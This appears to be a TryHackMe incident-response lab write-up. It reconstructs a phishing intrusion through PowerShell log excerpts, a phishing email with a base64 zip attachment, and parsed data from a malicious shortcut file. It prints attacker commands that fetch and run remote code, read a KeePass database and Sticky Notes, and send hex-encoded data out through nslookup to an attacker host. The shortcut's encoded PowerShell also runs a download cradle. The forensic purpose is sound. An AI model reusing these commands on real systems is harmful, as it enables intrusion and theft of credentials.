 
# Endpoint Evidence — Task 3
The following excerpts are pulled from the collected PowerShell logs (`powershell.json`) and show the attacker’s post-execution activity on `QL-WKSTN-5693`.
## Download cradle and Seatbelt
```text
2023-01-13 17:10:05.123Z  PowerShell: iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
2023-01-13 17:12:17.683688Z  PowerShell: iex(new-object net.webclient).downloadstring('https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1');pwd
2023-01-13 17:18:05.437844Z  Process: Seatbelt.exe -group=user
```
## Download and use of `sq3.exe` to query Sticky Notes DB
```text
2023-01-13 17:15:02.000Z  PowerShell: iwr http://files.bpakcaging.xyz/sq3.exe -outfile sq3.exe;pwd
2023-01-13 17:15:30.000Z  PowerShell: .\Music\sq3.exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite "SELECT * from NOTE limit 100";pwd
```
## Targeting KeePass DB and preparing hex-encoded payload
```text
2023-01-13 17:20:10.000Z  PowerShell: ls C:\\Users\\j.westcott\\Documents\\protected_data.kdbx;pwd
2023-01-13 17:20:12.000Z  PowerShell: $file='C:\\Users\\j.westcott\\Documents\\protected_data.kdbx'; $bytes = [System.IO.File]::ReadAllBytes($file); $hex = ($bytes | ForEach-Object { $_.ToString('x2') }) -join '';pwd
```
## DNS exfiltration attempt using `nslookup` to send hex data to attacker IP
```text
2023-01-13 17:21:05.000Z  PowerShell: for($i=0;$i -lt $hex.length; $i+=48){ $chunk = $hex.substring($i, [Math]::Min(48,$hex.length-$i)); nslookup "$chunk.exfil.bpakcaging.xyz" 167.71.211.113; } ;pwd
```
## Notes / collection guidance
- Preserve the `powershell.json` log file and export relevant PowerShell process creation events (ParentProcessName, CommandLine, Timestamp).
- Collect host network logs (DNS queries and any HTTP to `files.bpakcaging.xyz` / `cdn.bpakcaging.xyz`) for correlation with these timestamps.
- Acquire `plum.sqlite` and `protected_data.kdbx` from the host for offline analysis if allowed by policy; treat as potentially sensitive and handle per evidence handling policy.
# dump.eml (contents)
ubuntu@tryhackme:~/Desktop/artefacts$ cat dump.eml
Received: from KL1PR06MB6210.apcprd06.prod.outlook.com (2603:1096:820:d9::9)
 by TY2PR06MB2911.apcprd06.prod.outlook.com with HTTPS; Fri, 13 Jan 2023
 09:25:35 +0000
Received: from BN9PR03CA0626.namprd03.prod.outlook.com (2603:10b6:408:106::31)
 by KL1PR06MB6210.apcprd06.prod.outlook.com (2603:1096:820:d9::9) with
 Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.6002.9; Fri, 13 Jan
 2023 09:25:33 +0000
Received: from BN8NAM04FT033.eop-NAM04.prod.protection.outlook.com
 (2603:10b6:408:106:cafe::55) by BN9PR03CA0626.outlook.office365.com
 (2603:10b6:408:106::31) with Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.6002.13 via Frontend
 Transport; Fri, 13 Jan 2023 09:25:31 +0000
Authentication-Results: spf=pass (sender IP is 15.235.99.80)
 smtp.mailfrom=bpakcaging.xyz; dkim=pass (signature was verified)
 header.d=bpakcaging.xyz;dmarc=bestguesspass action=none
 header.from=bpakcaging.xyz;compauth=pass reason=109
Received-SPF: Pass (protection.outlook.com: domain of bpakcaging.xyz
 designates 15.235.99.80 as permitted sender) receiver=protection.outlook.com;
 client-ip=15.235.99.80; helo=pa80.mxout.mta1.net; pr=C
Received: from pa80.mxout.mta1.net (15.235.99.80) by
 BN8NAM04FT033.mail.protection.outlook.com (10.13.161.53) with Microsoft SMTP
 Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
 15.20.6002.13 via Frontend Transport; Fri, 13 Jan 2023 09:25:31 +0000
X-IncomingTopHeaderMarker:
 OriginalChecksum:B9E13D81CB0879339479CFF31A9D1BAC391FB1268EBA2DF1CD65E467A897D382;UpperCasedChecksum:607CA57AA5DFCDF80738AC3D7B95092AC0EED4788B0074646B818607350E6192;SizeAsReceived:1595;Count:13
DKIM-Signature: v=1; a=rsa-sha256; d=bpakcaging.xyz; s=api; c=relaxed/simple;
	t=1673601926; h=from:date:subject:reply-to:to:list-unsubscribe:mime-version;
	bh=DORzQK4K9VXO5g47mYpyX7cPagIyvAX1RLfbY0szvCc=;
	b=dCB9MhhsZqg4h2P9dg5zMjLj7HVS9vt0fXuqEzH8cj6ft+YBJxvZHkF8uc+CeOas6CoICaPu13Q
	oL/xVebg3aO8bmlooJWTAZx7mmrh/1ZQBVHm3wvGVI9Xn55nhWzRGoqVOAAPPM6+MEHFwZDIjKDAs
	RpDurrnykQeCXCp127k=
DKIM-Signature: v=1; a=rsa-sha256; d=elasticemail.com; s=api;
	c=relaxed/simple; t=1673601926;
	h=from:date:subject:reply-to:to:list-unsubscribe;
	bh=DORzQK4K9VXO5g47mYpyX7cPagIyvAX1RLfbY0szvCc=;
	b=jcC3z+U5lVQUJEYRyQ76Z+xaJMrXN2YdjyM8pUl7hgXesQaY7rqSORNRWynpDQ3/CBSllw31eDq
	WmoqpFqj2uVy5RXK73lkBEHs5ju1eH/4svHpZLS9+wU/tO5dfZVUImvY32iinpJCtoiMLjdpKYMA/
	d5BBGqluALtqy9fZQzM=
From: Arthur Griffin <agriffin@bpakcaging.xyz>
Date: Fri, 13 Jan 2023 09:25:26 +0000
Subject: Collection for Quick Logistics LLC - Jan 2023
Message-Id: <4uiwqc5wd1qx.HPk2p-JE_jYbkWIRB-SmuA2@tracking.bpakcaging.xyz>
Reply-To: Arthur Griffin <agriffin@bpakcaging.xyz>
Sender: agriffin@bpakcaging.xyz
To: Julianne Westcott <julianne.westcott@hotmail.com>
List-Unsubscribe:
 =?us-ascii?q?=3Cmailto=3Aunsubscribe+HPk2p-JE=5FjYbkWIRB-SmuA2=40bounces=2Eelasticem?=
 =?us-ascii?q?ail=2Enet=3Fsubject=3Dunsubscribe=3E=2C?=
 =?us-ascii?q?_=3Chttp=3A=2F=2Ftracking=2Ebpakcaging=2Exyz=2Ftracking=2Funsubscribe=3Fmsgid=3DHP?=
 =?us-ascii?q?k2p-JE=5FjYbkWIRB-SmuA2&c=3D0=3E?=
X-Msg-EID: HPk2p-JE_jYbkWIRB-SmuA2
Content-Type: multipart/mixed;
	boundary="=-eZCfLFLerDWBDeKhYPAtYh7o4CYv5vMw7XWKyw=="
X-IncomingHeaderCount: 13
Return-Path: agriffin@bpakcaging.xyz
X-MS-Exchange-Organization-ExpirationStartTime: 13 Jan 2023 09:25:31.7663
 (UTC)
X-MS-Exchange-Organization-ExpirationStartTimeReason: OriginalSubmit
X-MS-Exchange-Organization-ExpirationInterval: 1:00:00:00.0000000
X-MS-Exchange-Organization-ExpirationIntervalReason: OriginalSubmit
X-MS-Exchange-Organization-Network-Message-Id:
 7a3fe4a6-6d9a-42ef-a89c-08daf5481e17
X-EOPAttributedMessage: 0
X-EOPTenantAttributedMessage: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa:0
X-MS-Exchange-Organization-MessageDirectionality: Incoming
X-MS-PublicTrafficType: Email
X-MS-TrafficTypeDiagnostic: BN8NAM04FT033:EE_|KL1PR06MB6210:EE_
X-MS-Exchange-Organization-AuthSource:
 BN8NAM04FT033.eop-NAM04.prod.protection.outlook.com
X-MS-Exchange-Organization-AuthAs: Anonymous
X-MS-UserLastLogonTime: 1/13/2023 9:25:32 AM
X-MS-Office365-Filtering-Correlation-Id: 7a3fe4a6-6d9a-42ef-a89c-08daf5481e17
X-MS-Exchange-EOPDirect: true
X-Sender-IP: 15.235.99.80
X-SID-PRA: AGRIFFIN@BPAKCAGING.XYZ
X-SID-Result: PASS
X-MS-Exchange-Organization-PCL: 2
X-MS-Exchange-Organization-SCL: 5
X-Microsoft-Antispam: BCL:0;
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 13 Jan 2023 09:25:31.6882
 (UTC)
X-MS-Exchange-CrossTenant-Network-Message-Id: 7a3fe4a6-6d9a-42ef-a89c-08daf5481e17
X-MS-Exchange-CrossTenant-Id: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa
X-MS-Exchange-CrossTenant-AuthSource:
 BN8NAM04FT033.eop-NAM04.prod.protection.outlook.com
X-MS-Exchange-CrossTenant-AuthAs: Anonymous
X-MS-Exchange-CrossTenant-FromEntityHeader: Internet
X-MS-Exchange-CrossTenant-RMS-PersistedConsumerOrg:
 00000000-0000-0000-0000-000000000000
X-MS-Exchange-Transport-CrossTenantHeadersStamped: KL1PR06MB6210
X-MS-Exchange-Transport-EndToEndLatency: 00:00:04.0336339
X-MS-Exchange-Processed-By-BccFoldering: 15.20.6002.013
X-Microsoft-Antispam-Mailbox-Delivery:
	abwl:0;wl:1;pcwl:1;kl:0;dwl:0;dkl:0;rwl:0;ucf:0;jmr:0;ex:0;auth:1;dest:I;OFR:TrustedSenderList;ENG:(5062000305)(90000117)(91040095)(5061607266)(5061608174)(9050020)(9060121)(9100338)(2008001134)(4810004)(4910033)(8820095)(10005027)(9930004)(9610025)(9540006)(10160021)(9439006)(9310011)(9220031);
X-Message-Info:
	qZelhIiYnPlNyd1OgziR7PqHsQq4ZRpNilQNp6GRZx824bO/p1N0uTJoPSZmA77Un/3eDpWW+MwepB7uCCgLNb1FeD75MsLFumfIGzl2cUp7ZdsO/8YtRPalxvDhRGDA30n7uIyMFCxOqwqVBbeiuaa4Ex00yhLWPUL2oVhdtvkckjb//bmj5FyrlXvg7JZps/Zua4Bh2i67KodJgs+tDg==
X-Message-Delivery: Vj0xLjE7dXM9MDtsPTA7YT0wO0Q9MTtHRD0yO1NDTD0tMQ==
X-Microsoft-Antispam-Message-Info:
	=?utf-8?B?d3pNMUs5cnJiQkJCcDh3amlaWEJFYWxBbWpOelBGY3hMNjFmUC9RWk9iZ1o2?=
 =?utf-8?B?ZmxJcTlydlJ1aEhDVS9QbWlaTXR5c21nbldJOUtCK1hnQmM0anYza3RjVjU0?=
 =?utf-8?B?V3IxNGRBdTFDQTdTbzArWXJLOE9iR3dDSnFWL042WjZMRDQ1MkJkbVdVTWE0?=
 =?utf-8?B?ZVdGMHZQelhRWUFKM0JEYXNLV01Sdis2RXZ3M0VlU2Fnd1RjRjMzL3F4ZEFs?=
 =?utf-8?B?ZnQ2T0xBRTNHdXdIQWpkMXg3TEx5Nk1GU1lpNWNDNmRJWDNpS0hPOTc1T2V4?=
 =?utf-8?B?Y0xTejkyckNIY1doSFNIc1FSay9PL1RodU5iSk1EcG9wWlJXby9hZjljdnBD?=
 =?utf-8?B?N29qOFlOa2dCamN3QVlKU3FRY29HaTd2amFtQmRRUWlIYktFOGF1M2twNFJB?=
 =?utf-8?B?bzUzcE03ckZRdXZYdjM0S2wrWUhpYXFmTWdPRzFIQXNzQm1qaW5ndzBJb2NK?=
 =?utf-8?B?eEc5WEdWZ1dDMW9QUEs2N0F6U2FNUnQxb0FBbVNZcHUva1o5TmZHNGVnS0g1?=
 =?utf-8?B?cG4xSTlSSFRkaG9adVJrMGNxUkRiblRDelRIN0VjVFV3cHpzcUIvQ2ZxRzJy?=
 =?utf-8?B?MjAzaFJkYllobVh1MEdLRndRcFR3cXR1L0tTdXZ5YnZsdWNOcHlyMWFza1lZ?=
 =?utf-8?B?bW1IcFBDK21EV3JsMm9mM0piNW1pWjd1UWx0QytkL0dzOWxtRTZGMXNOZU5B?=
 =?utf-8?B?Vnh1T0FDMlI1SU5jL09Qd1BFMHNEOTVKcTQ5Tk50VGRESXRkaWEyYUhRL3NP?=
 =?utf-8?B?VCtWcmowRkN4VEdhbjlaK1RRTGN1VjNiMEtjRkdVY040SXNxU3N2QURnbTBw?=
 =?utf-8?B?QXdIaTRLS2pNellrNHpGVjVHZWFqdm9sS2ljZzk2KzRKYkI2V0FFNXpVWEh0?=
 =?utf-8?B?MXQzTGdKUnpZRzlmb0R1VDhnSlhBZFZ2eWZ1SE95NlVxWWw4OHhVYitkT2g3?=
 =?utf-8?B?Ti9Tbno0R1JGNFh0bHFyUllIM1JWMUFqcHVGNEVkVTN5ZHNxazA2TDFiNzJn?=
 =?utf-8?B?cml1REdXQU1MVTJqSElZWVNIM0dhdTZ3aWFZczlWTHNNeGZPZm0zb0RRVHQ4?=
 =?utf-8?B?MERQOG9ZYXdLR09BSWNlYVR1UmlhRzRab29UcDE1UnljcHBDZHRUSHgxcjRK?=
 =?utf-8?B?aCswbm9iVHlpVEVjZVVQUmdzSytFanRFcUJONkdSMzZJangvMEFHcjF1NXBY?=
 =?utf-8?B?eWxRV2FiYVZ3UXN3ZXVZWTlGVEhWQmZNMkxVL3RidnV2UmVxVWMrV05XNkQ5?=
 =?utf-8?B?QzM1MUFDeHI5bGc4UGRnQWRyL2E1dkJLR29BMXdYaStFa2QraGxqSSs4OVI1?=
 =?utf-8?B?OFdOL2VhRU5abGE1S0k1ZURBajFmQzE0U3pTenEzbmVIVFpKdml1TzZUNWFs?=
 =?utf-8?B?RUsxNHdsNXY0bUVPVW9DSEdLTnBJNGVzKzY0ckxDY3BCaGlSMHY3cWR6bkpT?=
 =?utf-8?B?WVo2aTNEa2EvOHRzek1lL05Vd0RSaWRJTTNZbWV4RnE3aEdvOEptbjB1M3Ev?=
 =?utf-8?B?THFjQW94NnhYQVRad1VVSC8zMENCcWNaTTJWSkhUWGJscHZuMnFseVczd0xa?=
 =?utf-8?B?d0JyVDV6WGpnVVpGVDd3WHJIajdVSUdKdysxQUkyZXBRbnpUUUJ3T0RhcmhX?=
 =?utf-8?B?SUIvUVVwT3M2RU83OWRxMmdiNU1wNUVYVDBkb21pOTNNRGNoWmNyTXUrNVdl?=
 =?utf-8?B?TThGRlVJdXlWeHF0aVlBMVBoZFRXZ0ovMWVpMkMxV2lCellKREkwY041d3Nu?=
 =?utf-8?B?Z2FEM3IwTUllaTYrUEQ4cEVmMWNEajVPVit6aGI5S1VSOGdnMmRhNlQ4K1dI?=
 =?utf-8?B?OFk5QkRZY09HTWF0dGxMMFZJL1Z0bnpaZTBCWlZBb1NqK2hNOUFNamNwOWVi?=
 =?utf-8?B?cUJLaGxRVzBTK0g4bEdta3JTQjRQRFU0WkdoeVcvOXp5MXBQZy9kdHIwTUoy?=
 =?utf-8?B?VWZQbDRybzBjcmRYYS9SVlNGMm5Mc2NBTU1wWVFXOXdFN2VUODZSWjZiSlY5?=
 =?utf-8?B?cGRQa2FQcFgwWE9XTHJ1NTllRE40RVpSSFpJaWlmaHhVYmo5UXJOTHE0WTNQ?=
 =?utf-8?B?MmJtMVBrb1FHeW9CNGtkMnBsVXRBWjREM1FDaUdpRUZndDF4eXYwOHoxTXFH?=
 =?utf-8?B?QmowRUFaYTh2VVhDdHhFa2ZnQ2VRczQ3di91UUIyN3lWSnBXUk9UNXVMS0cz?=
 =?utf-8?B?UGozazZGcnZucnV6YTNNQlhqakNSN25KZGVWYVBBaHowY1l0MWVvdlNja25z?=
 =?utf-8?B?dnU4R0RlTDNoaVJaSUZDdU85QmZDSi9oMjVxTkcvcnBJR1lmSkJrK3VneXV1?=
 =?utf-8?B?K1RXcFJMME9QSDZScUdLNVpaWkhtTXNIT3ZvbVRzRkpocVZidC90dEFma2NM?=
 =?utf-8?B?Uk5HMzlaVVZubXdUc0ZEdG95bzdZL3JLSnpWTnVqWHRVN28yeGtBeEFmVjJB?=
 =?utf-8?B?WlQ5b1RSa1dHUmtoTzZVeTZsS3NoRW1aOS9yOU1IS0srK2RaWUxobHE2M0Jy?=
 =?utf-8?B?UDZWQUdWREJJYzJ6Ujg3cVhsZnpmWURjci95ZUUvMUFtS0lZbHViMmorRy84?=
 =?utf-8?B?T0RqOXJ6WDhoS3NPbVZ3bXRNWnpXcllBV05FZCtZMmJlcmI0Mm1zdlJQdkpB?=
 =?utf-8?B?NVhLMXMwdDlKNWE0TDhxR2pSQURDN1VMdWJJQU9Ic3pSbEVXKzJTY1FHNEFv?=
 =?utf-8?B?S1R3VXZKSjFhbk1iQlV4V3NxT01IVjNpS0w4SkY0TDY4bnhPUW53VDVTdldY?=
 =?utf-8?B?aHQ3U0ZIZzhRSEpFRllLSEpyZk9xV080OEY5OS9tdFRVdFpaelhFcWpiOVBO?=
 =?utf-8?B?TS9ZRFhBeS80K2xLTHNZVTR6UW1peXBRQ1dzSkF4cGtNSkpoVVF3TTROcWRx?=
 =?utf-8?B?ejZmSEhRODZUYWRvRzhZSyt6QT09?=
MIME-Version: 1.0

--=-eZCfLFLerDWBDeKhYPAtYh7o4CYv5vMw7XWKyw==
Content-Type: multipart/alternative;
	boundary="=-eZCfLFLerDWBDeKhYPAtYh7o4CYv5vMw7XWKzQ=="

--=-eZCfLFLerDWBDeKhYPAtYh7o4CYv5vMw7XWKzQ==
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable


Hi Julianne,

I hope you are well.

I just wanted to drop you a quick note to remind you in respect of doc=
ument #39586972 is due for payment on January 20, 2023.

I would be grateful if you could confirm everything is on track for pa=
yment.

For additional information, kindly see the attached document.

You may use this code to view the encrypted file: Invoice2023!


Best regards,
Arthur Griffin
Collections Officer
B Packaging Inc.

E: agriffin@bpackaging.xyz
W: http://tracking.bpakcaging.xyz/tracking/click?d=3DURMWrjI0OT2vNPUjG=
Un3OZ3jpeKRtRwemj2AZ6Bm1SIUCt-NdD3Lf9RozGOna5hzVa2b7mlq2uPqWZ-ulX3RVQQ=
D1HPcDMn6WjYqv7d10NcZbam10x7BmNl_hKSmy0GP9w2
http://tracking.bpakcaging.xyz/tracking/unsubscribe?d=3DHgbeKaSL-7al2K=
ewtOSPNa1ficRJPV33ZIpO5ezJtLh4oUgXsQInRMJ36_CuhPXx_b_05wsIcNuKFlnAe7bI=
RrputdJtEn0Ju6VveHpeDxxd0
--=-eZCfLFLerDWBDeKhYPAtYh7o4CYv5vMw7XWKzQ==
Content-Type: text/html; charset=utf-8
Content-Transfer-Encoding: quoted-printable

<html>
<head>
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dutf-8"></=
head>
<body style=3D"font-size: 13px; font-family: Helvetica;">
<br>
<p>Hi Julianne,</p>

<p>I hope you are well.</p>

<p>I just wanted to drop you a quick note to remind you in respect of docum=
ent #39586972 is due for payment on January 20, 2023.</p>

<p>I would be grateful if you could confirm everything is on track for paym=
ent.</p>

<p>For additional information, kindly see the attached document.<br><br>
You may use this code to view the encrypted file: <strong>Invoice2023!</str=
ong></p>


<p>Best regards,<br>
<strong>Arthur Griffin</strong><br>
Collections Officer<br>
B Packaging Inc.<br><br>

E: agriffin@bpackaging.xyz<br>
W: https://bpackaging.xyz</p>
<img src=3D"http://tracking.bpakcaging.xyz/tracking/open?msgid=3DHPk2p-JE_j=
YbkWIRB-SmuA2&amp;c=3D0" style=3D"width:1px;height:1px" alt=3D""><div style=
=3D"text-align:center; background-color:#fff;padding-top:10px;padding-botto=
m:10px;font-size:8pt;font-family:sans-serif;"><a href=3D"http://tracking.bp=
akcaging.xyz/tracking/unsubscribe?d=3DHgbeKaSL-7al2KewtOSPNa1ficRJPV33ZIpO5=
ezJtLh4oUgXsQInRMJ36_CuhPXx_b_05wsIcNuKFlnAe7bIRrputdJtEn0Ju6VveHpeDxxd0" s=
tyle=3D"text-align:center;text-decoration:none;color:#666;">UNSUBSCRIBE</a>=
</div></body>
</html>=

--=-eZCfLFLerDWBDeKhYPAtYh7o4CYv5vMw7XWKzQ==--

--=-eZCfLFLerDWBDeKhYPAtYh7o4CYv5vMw7XWKyw==
Content-Type: application/zip
Content-Disposition: attachment; filename="Invoice.zip"; size=908;
Content-Transfer-Encoding: base64

UEsDBBQAAQAIAGiGLVZRFQDJ3gIAACgJAAAUAAAASW52b2ljZV8yMDIzMDEwMy5sbmvuhS6/jU+4
ClhWAZwY+LBcOUvw6oMIq5WNiZwjlKXvAj+pMMBFROiABqlJBxngGOoWUKX0yBXsXOhYPq3Z+Zls
vZX0xZqtZ/KWnX/QpZXzW44KZz1eqH+hnLgKXPTBsyTSqpqK9QUvYEsltPMSYnL0IqSNwX2TuL9l
oB0QB3owNKK2cltANxR5Nt3pdYwKJ4BqqI4x7D/ze4bWBT1jlR4HW8VEByEyLoc2fw3I0r0bc/8J
v9g1SZPBvshBg0pxI0/89GR2agMP+Lv6smkO/huUEOSRpidp/ft+prkt5v9sHFyS/Q0CTb9njCi2
terQ9NTeFAOkNAhGxWUPqPwPzB0cS+GBC2JY3LMqlA0K5aTejRodyVPcLlq2KVbyF7XljH2NZA4T
bFsDNJMFk2fQB1hfvmseP9FA20VAfwYvYW8GnBDdqhJtAwJ5xNvJgFFK/MTY2fChwTNN2zszqhzn
v1Sx+71+duA41HGR9K/jh4nEeRgPslOVlGtLwKBikbIpx/5ZaLpiZYwKS177jDoh3Qx+FRxsM6Ue
hjPSNgKmWHFZjReDWx8KD7qGLL9acO0hvZUuH83b70sAREDJbw+4sC2jcYO+hrHys6E4Dml030WQ
WhkKpvYv4DUw9nDmkGg4YgnyAv/iMbtImSUZQ/Wc6dEJM213hYefp8DTQZ321fZU5iCk86bAdxX2
3Ov40S9eX78X7CSp9b0QKNeC+N3JgMJ/gQrCWC73UfmHjT4mkBoP8A4YktR2LFNeistVP/zeMQPS
qUs8KaI7q+VTu/9buNeWkEW2maDm+bC0Q4AnJL+AocgZDPJ0RzfLWEpff3nbaYb6aPqhLTBfFURi
dszLIMEKmDLmiVqkWZJly9qV26NFttz5y4Q+fAATd6tMYRDlu/BFCo4+rdxjiKl0Gnn7UBHCq0gy
eEv/L8bppKI09XqNV3MJxMLBE3RN7E080hVp07qDpNpQTYEFa08gGy6yYFBLAQI/ABQAAQAIAGiG
LVZRFQDJ3gIAACgJAAAUACQAAAAAAAAAIAAAAAAAAABJbnZvaWNlXzIwMjMwMTAzLmxuawoAIAAA
AAAAAQAYAGiPRUBvJ9kBAAAAAAAAAAAAAAAAAAAAAFBLBQYAAAAAAQABAGYAAAAQAwAAAAA=

--=-eZCfLFLerDWBDeKhYPAtYh7o4CYv5vMw7XWKyw==--

# lnkparse Invoice_20230103.lnk (to get the command line arguments)
ubuntu@tryhackme:~/Desktop/artefacts$ lnkparse Invoice_20230103.lnk
Windows Shortcut Information:
   Link CLSID: 00021401-0000-0000-C000-000000000046
   Link Flags: HasTargetIDList | HasName | HasRelativePath | HasWorkingDir | HasArguments | HasIconLocation | IsUnicode | HasExpIcon - (16637)
   File Flags:  - (0)

   Creation Timestamp: None
   Modified Timestamp: None
   Accessed Timestamp: None

   Icon Index: 0 
   Window Style: SW_SHOWMINNOACTIVE 
   HotKey: CONTROL - C {0x4302} 

   TARGETS:
      Index: 78
      ITEMS:
         Root Folder
            Sort index: My Computer
            Guid: 20D04FE0-3AEA-1069-A2D8-08002B30309D
         Volume Item
            Flags: 0xf
            Data: None
         File entry
            Flags: Is directory
            Modification time: None
            File attribute flags: 16
            Primary name: Windows
         File entry
            Flags: Is directory
            Modification time: None
            File attribute flags: 16
            Primary name: System32
         File entry
            Flags: Is directory
            Modification time: None
            File attribute flags: 16
            Primary name: WindowsPowerShell
         File entry
            Flags: Is directory
            Modification time: None
            File attribute flags: 16
            Primary name: v1.0
         File entry
            Flags: Is file
            Modification time: None
            File attribute flags: 0
            Primary name: powershell.exe

   DATA
      Description: Invoice Jan 2023
      Relative path: ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
      Working directory: C:
      Command line arguments: -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
      Icon location: C:\Users\Administrator\Desktop\excel.ico

   EXTRA BLOCKS:
      ICON_LOCATION_BLOCK
         Target ansi: %USERPROFILE%\Desktop\excel.ico
         Target unicode: %USERPROFILE%\Desktop\excel.ico
      SPECIAL_FOLDER_LOCATION_BLOCK
         Special folder id: 37
      KNOWN_FOLDER_LOCATION_BLOCK
         Known folder id: 1AC14E77-02E7-4E5D-B744-2EB1AE5198B7
      METADATA_PROPERTIES_BLOCK
         Version: 0x53505331
         Format id: 46588AE2-4CBC-4338-BBFC-139326986DCE

